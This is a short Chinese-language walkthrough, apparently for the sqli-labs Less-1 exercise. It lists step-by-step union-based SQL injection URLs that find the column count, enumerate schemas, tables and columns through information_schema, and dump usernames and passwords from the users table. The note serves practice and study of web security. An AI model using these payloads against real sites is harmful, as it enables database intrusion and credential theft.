
# sql-libs

* less1
```
猜测有字段数量：http://IP/sqli-libs/Less-1?id=1' order by 4--+
猜测回显位置：http://IP/sqli-libs/Less-1?id=-1' union select 1,2,3--+
猜测当前数据库名：http://IP/sqli-libs/Less-1?id=-1' union select 1,(select database()),3--+
猜测数据库表名：http://IP/sqli-libs/Less-1?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+
获取数据库中所有表：http://IP/sqli-libs/Less-1?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479) --+
获取列名：http://IP/sqli-libs/Less-1?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema =0x7365637572697479 and table_name=0x7573657273)--+
获取具体数据：http://IP/sqli-libs/Less-1?id=-1' union select 1,2,(select group_concat(id,0x7c,username,0x7c,password) from security.users)--+
获取数据库版本：http://IP/sqli-libs/Less-1?id=-1' union select 1,version(),database()--+
```



